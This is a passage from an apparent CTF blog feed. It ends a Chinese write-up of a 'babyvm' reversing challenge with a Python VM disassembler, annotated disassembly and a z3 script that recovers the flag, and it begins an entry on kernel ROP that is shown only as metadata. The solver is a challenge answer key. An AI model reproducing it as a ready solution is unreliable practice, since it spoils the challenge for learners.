class="number">0x3</span>: <span class="string">"call"</span>,</span><br><span class="line">    <span class="number">0x4</span>: <span class="string">"ret"</span>,</span><br><span class="line">    <span class="number">0x5</span>: <span class="string">"jmp"</span>,</span><br><span class="line">    <span class="number">0x6</span>: <span class="string">"je"</span>,</span><br><span class="line">    <span class="number">0x7</span>: <span class="string">"neg rflag"</span>,</span><br><span class="line">    <span class="number">0x8</span>: <span class="string">"add"</span>,</span><br><span class="line">    <span class="number">0x9</span>: <span class="string">"sub"</span>,</span><br><span class="line">    <span class="number">0xA</span>: <span class="string">"mul"</span>,</span><br><span class="line">    <span class="number">0xB</span>: <span class="string">"div"</span>,</span><br><span class="line">    <span class="number">0xC</span>: <span class="string">"xor"</span>,</span><br><span class="line">    <span class="number">0xD</span>: <span class="string">"push"</span>, <span class="comment"># reg</span></span><br><span class="line">    <span class="number">0xE</span>: <span class="string">"cmp"</span>,</span><br><span class="line">    <span class="number">0xF</span>: <span class="string">"and"</span>,</span><br><span class="line">    <span class="number">0x10</span>: <span class="string">"or"</span>,</span><br><span class="line">    <span class="number">0x11</span>: <span class="string">"ror"</span>,</span><br><span class="line">    <span class="number">0x12</span>: <span class="string">"rol"</span>,</span><br><span class="line">    <span class="number">0x13</span>: <span class="string">"neg"</span>,</span><br><span class="line">    <span class="number">0x14</span>: <span class="string">"mod"</span>,</span><br><span class="line">    <span class="number">0xD0</span>: <span class="string">"push"</span>,</span><br><span class="line">    <span class="number">0xE0</span>: <span class="string">"mov"</span>, <span class="comment"># to stack</span></span><br><span class="line">    <span class="number">0xF0</span>: <span class="string">"mov"</span>, <span class="comment"># to stack (imm)</span></span><br><span class="line">    <span class="number">0xFF</span>: <span class="string">"halt"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line">pc = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> pc &lt; len(ins):</span><br><span class="line">    print(hex(pc) + <span class="string">": "</span>),</span><br><span class="line"></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    op = ins[pc]</span><br><span class="line">    <span class="keyword">if</span> op == <span class="number">0x0</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">5</span>]) + <span class="string">" "</span></span><br><span class="line">        res +=  <span class="string">"[$sp + 4 * "</span> + str((ins[pc + <span class="number">4</span>] &lt;&lt; <span class="number">24</span>) + (ins[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) + (ins[pc + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) + ins[pc + <span class="number">1</span>]) + <span class="string">"]"</span></span><br><span class="line">        pc += <span class="number">6</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x1</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += hex((ins[pc + <span class="number">4</span>] &lt;&lt; <span class="number">24</span>) + (ins[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) + (ins[pc + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) + ins[pc + <span class="number">1</span>])</span><br><span class="line">        pc += <span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x2</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x3</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += hex((ins[pc + <span class="number">4</span>] &lt;&lt; <span class="number">24</span>) + (ins[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) + (ins[pc + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) + ins[pc + <span class="number">1</span>])</span><br><span class="line">        pc += <span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x4</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x5</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += hex((ins[pc + <span class="number">4</span>] &lt;&lt; <span class="number">24</span>) + (ins[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) + (ins[pc + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) + ins[pc + <span class="number">1</span>])</span><br><span class="line">        pc += <span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x6</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += hex((ins[pc + <span class="number">4</span>] &lt;&lt; <span class="number">24</span>) + (ins[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) + (ins[pc + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) + ins[pc + <span class="number">1</span>])</span><br><span class="line">        pc += <span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x7</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x8</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x9</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xA</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xB</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xC</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xD</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xE</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xF</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x10</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x11</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x12</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x13</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x14</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">1</span>]) + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">2</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xD0</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"[$data + 4 * "</span> + str((ins[pc + <span class="number">4</span>] &lt;&lt; <span class="number">24</span>) + (ins[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) + (ins[pc + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) + ins[pc + <span class="number">1</span>]) + <span class="string">"]"</span> + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xE0</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"[$sp + 4 * "</span> + str((ins[pc + <span class="number">4</span>] &lt;&lt; <span class="number">24</span>) + (ins[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) + (ins[pc + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) + ins[pc + <span class="number">1</span>]) + <span class="string">"]"</span> + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"r"</span> + str(ins[pc + <span class="number">5</span>]) + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">6</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xF0</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        res += <span class="string">"[$sp + 4 * "</span> + str((ins[pc + <span class="number">4</span>] &lt;&lt; <span class="number">24</span>) + (ins[pc + <span class="number">3</span>] &lt;&lt; <span class="number">16</span>) + (ins[pc + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) + ins[pc + <span class="number">1</span>]) + <span class="string">"]"</span> + <span class="string">" "</span></span><br><span class="line">        res += hex((ins[pc + <span class="number">8</span>] &lt;&lt; <span class="number">24</span>) + (ins[pc + <span class="number">7</span>] &lt;&lt; <span class="number">16</span>) + (ins[pc + <span class="number">6</span>] &lt;&lt; <span class="number">8</span>) + ins[pc + <span class="number">5</span>])</span><br><span class="line">        pc += <span class="number">9</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xFF</span>:</span><br><span class="line">        res += opcode[op] + <span class="string">" "</span></span><br><span class="line">        pc += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    print(res)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure> 提取结果： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0</span>:  push [$data + <span class="number">4</span> * <span class="number">0</span>] </span><br><span class="line"><span class="number">0x5</span>:  pop r1 </span><br><span class="line"><span class="number">0x7</span>:  push r1 </span><br><span class="line"><span class="number">0x9</span>:  pop r4 </span><br><span class="line"><span class="number">0xb</span>:  push <span class="number">0x10</span></span><br><span class="line"><span class="number">0x10</span>:  pop r1 </span><br><span class="line"><span class="number">0x12</span>:  push <span class="number">0x0</span></span><br><span class="line"><span class="number">0x17</span>:  pop r3 </span><br><span class="line"><span class="number">0x19</span>:  push <span class="number">0x1</span></span><br><span class="line"><span class="number">0x1e</span>:  pop r2 </span><br><span class="line"><span class="number">0x20</span>:  sub r1 r2 </span><br><span class="line"><span class="number">0x23</span>:  push r1 </span><br><span class="line"><span class="number">0x25</span>:  pop r5 </span><br><span class="line"><span class="number">0x27</span>:  push <span class="number">0x8</span></span><br><span class="line"><span class="number">0x2c</span>:  pop r6 </span><br><span class="line"><span class="number">0x2e</span>:  mod r5 r6 </span><br><span class="line"><span class="number">0x31</span>:  ror r4 r5 </span><br><span class="line"><span class="number">0x34</span>:  push <span class="number">0x9e3779b9</span></span><br><span class="line"><span class="number">0x39</span>:  pop r5 </span><br><span class="line"><span class="number">0x3b</span>:  xor r4 r5                  <span class="comment"># r4 = ror(input, i % 0x10) ^ 0x9e3779b9</span></span><br><span class="line"><span class="number">0x3e</span>:  push r4 </span><br><span class="line"><span class="number">0x40</span>:  call <span class="number">0xad</span>                  </span><br><span class="line"><span class="number">0x45</span>:  xor r4 r1                  </span><br><span class="line"><span class="number">0x48</span>:  pop r4                     <span class="comment"># return here      r4 = rol(r4, 6)             # input[0] = r4</span></span><br><span class="line"><span class="number">0x4a</span>:  cmp r1 r3 </span><br><span class="line"><span class="number">0x4d</span>:  neg rflag                  <span class="comment"># loop 0x10 times</span></span><br><span class="line"><span class="number">0x4e</span>:  je <span class="number">0x19</span></span><br><span class="line"><span class="number">0x53</span>:  push [$data + <span class="number">4</span> * <span class="number">1</span>] </span><br><span class="line"><span class="number">0x58</span>:  push [$data + <span class="number">4</span> * <span class="number">2</span>] </span><br><span class="line"><span class="number">0x5d</span>:  pop r2 </span><br><span class="line"><span class="number">0x5f</span>:  pop r3 </span><br><span class="line"><span class="number">0x61</span>:  push r4 </span><br><span class="line"><span class="number">0x63</span>:  pop r5 </span><br><span class="line"><span class="number">0x65</span>:  <span class="keyword">or</span> r5 r2                   </span><br><span class="line"><span class="number">0x68</span>:  <span class="keyword">or</span> r5 r3                   <span class="comment"># input[0] | input[1] | input[2]</span></span><br><span class="line"><span class="number">0x6b</span>:  push r5 </span><br><span class="line"><span class="number">0x6d</span>:  push r4 </span><br><span class="line"><span class="number">0x6f</span>:  pop r5 </span><br><span class="line"><span class="number">0x71</span>:  <span class="keyword">and</span> r5 r2 </span><br><span class="line"><span class="number">0x74</span>:  <span class="keyword">and</span> r5 r3                  <span class="comment"># input[0] &amp; input[1] &amp; input[2]</span></span><br><span class="line"><span class="number">0x77</span>:  push r5 </span><br><span class="line"><span class="number">0x79</span>:  push r4  </span><br><span class="line"><span class="number">0x7b</span>:  pop r5 </span><br><span class="line"><span class="number">0x7d</span>:  <span class="keyword">and</span> r5 r2                  <span class="comment"># input[0] &amp; input[2]</span></span><br><span class="line"><span class="number">0x80</span>:  push r5 </span><br><span class="line"><span class="number">0x82</span>:  push r4 </span><br><span class="line"><span class="number">0x84</span>:  pop r5 </span><br><span class="line"><span class="number">0x86</span>:  <span class="keyword">and</span> r5 r3                  <span class="comment"># input[0] &amp; input[1]</span></span><br><span class="line"><span class="number">0x89</span>:  push r5 </span><br><span class="line"><span class="number">0x8b</span>:  push r2 </span><br><span class="line"><span class="number">0x8d</span>:  pop r5 </span><br><span class="line"><span class="number">0x8f</span>:  <span class="keyword">and</span> r5 r3                  <span class="comment"># input[2] &amp; input[1]</span></span><br><span class="line"><span class="number">0x92</span>:  pop r6 </span><br><span class="line"><span class="number">0x94</span>:  xor r5 r6 </span><br><span class="line"><span class="number">0x97</span>:  pop r6 </span><br><span class="line"><span class="number">0x99</span>:  xor r5 r6 </span><br><span class="line"><span class="number">0x9c</span>:  pop r6 </span><br><span class="line"><span class="number">0x9e</span>:  xor r5 r6 </span><br><span class="line"><span class="number">0xa1</span>:  pop r6 </span><br><span class="line"><span class="number">0xa3</span>:  xor r5 r6 </span><br><span class="line"><span class="number">0xa6</span>:  push r5                    <span class="comment"># xor and neg</span></span><br><span class="line"><span class="number">0xa8</span>:  pop r1 </span><br><span class="line"><span class="number">0xaa</span>:  neg r1 </span><br><span class="line"><span class="number">0xac</span>:  halt </span><br><span class="line"><span class="number">0xad</span>:  mov r1 [$sp + <span class="number">4</span> * <span class="number">8</span>]</span><br><span class="line"><span class="number">0xb3</span>:  push <span class="number">0x3</span></span><br><span class="line"><span class="number">0xb8</span>:  pop r2 </span><br><span class="line"><span class="number">0xba</span>:  add r1 r2              <span class="comment"># ret_addr += 3 ==&gt; 0x48</span></span><br><span class="line"><span class="number">0xbd</span>:  mov [$sp + <span class="number">4</span> * <span class="number">8</span>] r1 </span><br><span class="line"><span class="number">0xc3</span>:  mov r2 [$sp + <span class="number">4</span> * <span class="number">9</span>]</span><br><span class="line"><span class="number">0xc9</span>:  push <span class="number">0x6</span></span><br><span class="line"><span class="number">0xce</span>:  pop r3 </span><br><span class="line"><span class="number">0xd0</span>:  rol r2 r3 </span><br><span class="line"><span class="number">0xd3</span>:  mov [$sp + <span class="number">4</span> * <span class="number">9</span>] r2 </span><br><span class="line"><span class="number">0xd9</span>:  ret</span><br></pre></td></tr></table></figure></li><li>z3约束求解： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(v8)</span>:</span></span><br><span class="line">    v13 = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        v10 = <span class="number">0</span></span><br><span class="line">        v8 ^= <span class="number">0xC3</span></span><br><span class="line">        v13.append(v8&amp;<span class="number">0xff</span>)</span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            v10 ^= (v8 &gt;&gt; l) &amp; <span class="number">1</span></span><br><span class="line">        v8 = (v10 | <span class="number">2</span> * v8)&amp;<span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> v13</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10</span>):</span><br><span class="line">        cipher = ((cipher &amp; <span class="number">0x3F</span>) &lt;&lt; <span class="number">26</span>) | (cipher &gt;&gt; <span class="number">6</span>)</span><br><span class="line">        cipher ^= <span class="number">0x9e3779b9</span></span><br><span class="line">        cipher = ((cipher &lt;&lt; (i % <span class="number">0x8</span>)) &amp; <span class="number">0xFFFFFFFF</span>) | ((cipher &gt;&gt; (<span class="number">32</span> - (i % <span class="number">0x8</span>))))</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span><span class="params">(v1, v2, v3, v4)</span>:</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        res = (res + (v1 &amp; <span class="number">0xFF</span>) + (v2 &amp; <span class="number">0xFF</span>) + (v3 &amp; <span class="number">0xFF</span>) + (v4 &amp; <span class="number">0xFF</span>)) % <span class="number">100</span></span><br><span class="line">        v1 &gt;&gt;= <span class="number">8</span></span><br><span class="line">        v2 &gt;&gt;= <span class="number">8</span></span><br><span class="line">        v3 &gt;&gt;= <span class="number">8</span></span><br><span class="line">        v4 &gt;&gt;= <span class="number">8</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">in2 = [<span class="number">0x0C5D83690</span>, <span class="number">0x978162EA</span>, <span class="number">0x1932A96C</span>, <span class="number">0x4222669</span>]</span><br><span class="line">out = [<span class="number">0x1F7902CC</span>, <span class="number">0x2FAE3D15</span>, <span class="number">0x0CEEBFE91</span>, <span class="number">0x0AFF6AF42</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> v8 <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    in3 = foo(v8)</span><br><span class="line">    in3 = <span class="string">""</span>.join([chr(x) <span class="keyword">for</span> x <span class="keyword">in</span> in3])</span><br><span class="line">    <span class="comment"># print len(in3)</span></span><br><span class="line">    in3 = md5(in3).digest()</span><br><span class="line">    solver = Solver()</span><br><span class="line">    k = [BitVec(<span class="string">'k%d'</span>%i, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        x1 = bytes_to_long(in3[<span class="number">4</span>*i:(i+<span class="number">1</span>)*<span class="number">4</span>][::<span class="number">-1</span>])</span><br><span class="line">        x2 = in2[i]</span><br><span class="line">        solver.add(((x1&amp;x2&amp;k[i]) ^ (x1|x2|k[i]) ^ (x1&amp;x2) ^ (x1&amp;k[i]) ^ (x2&amp;k[i]))^<span class="number">0xFFFFFFFF</span> == out[i])</span><br><span class="line">    solver.check()</span><br><span class="line">    x0 = solver.model().eval(k[<span class="number">0</span>]).as_long() </span><br><span class="line">    x1 = solver.model().eval(k[<span class="number">1</span>]).as_long()</span><br><span class="line">    x2 = solver.model().eval(k[<span class="number">2</span>]).as_long()</span><br><span class="line">    x3 = solver.model().eval(k[<span class="number">3</span>]).as_long()</span><br><span class="line">    x0 = decrypt(x0)</span><br><span class="line">    x1 = decrypt(x1)</span><br><span class="line">    x2 = decrypt(x2)</span><br><span class="line">    x3 = decrypt(x3)</span><br><span class="line">    <span class="comment"># print x0,x1,x2,x3</span></span><br><span class="line">    res = count(x0,x1,x2,x3)</span><br><span class="line">    <span class="comment"># print res</span></span><br><span class="line">    <span class="keyword">if</span> res == v8:</span><br><span class="line">        <span class="keyword">print</span> x0,x1,x2,x3</span><br><span class="line">        final = (long_to_bytes(x0)[::<span class="number">-1</span>]+long_to_bytes(x1)[::<span class="number">-1</span>]+long_to_bytes(x2)[::<span class="number">-1</span>]+long_to_bytes(x3)[::<span class="number">-1</span>]).encode(<span class="string">"hex"</span>)</span><br><span class="line">        <span class="keyword">print</span> final</span><br><span class="line"></span><br><span class="line">        flag = <span class="string">"flag&#123;"</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(final)):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">8</span> <span class="keyword">or</span> i == <span class="number">12</span> <span class="keyword">or</span> i == <span class="number">16</span> <span class="keyword">or</span> i == <span class="number">20</span>:</span><br><span class="line">                flag += <span class="string">"-"</span></span><br><span class="line">            flag += final[i]</span><br><span class="line">        flag += <span class="string">"&#125;"</span></span><br><span class="line"></span><br><span class="line">        print(flag)</span><br><span class="line">    </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0C5D83690h, 1F7902CCh, 978162EAh, 2FAE3D15h, 1932A96Ch</span></span><br><span class="line"><span class="string">.data:00007FF6501E20E0                                         ; DATA XREF: sub_7FF6500BCCB0+55↑o</span></span><br><span class="line"><span class="string">.data:00007FF6501E20E0                 dd 0CEEBFE91h, 4222669h, 0AFF6AF42h,</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pwn学艺不精，确认过名字，是我没学过的类型。就搞了一个babyvm，java是后来看的，还有个babyperf，最近rev做得少，没见过，还没搞出来，学一波先。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.github.io/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="rev" scheme="https://n0nop.github.io/tags/rev/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn: ROP（续）</title>
    <link href="https://n0nop.github.io/2020/05/13/kernel-pwn-ROP%EF%BC%88%E7%BB%AD%EF%BC%89/"/>
    <id>https://n0nop.github.io/2020/05/13/kernel-pwn-ROP%EF%BC%88%E7%BB%AD%EF%BC%89/</id>
    <published>2020-05-13T01:20:41.000Z</published>
    <updated>2021-03-28T14:15:39.431Z</updated>
    
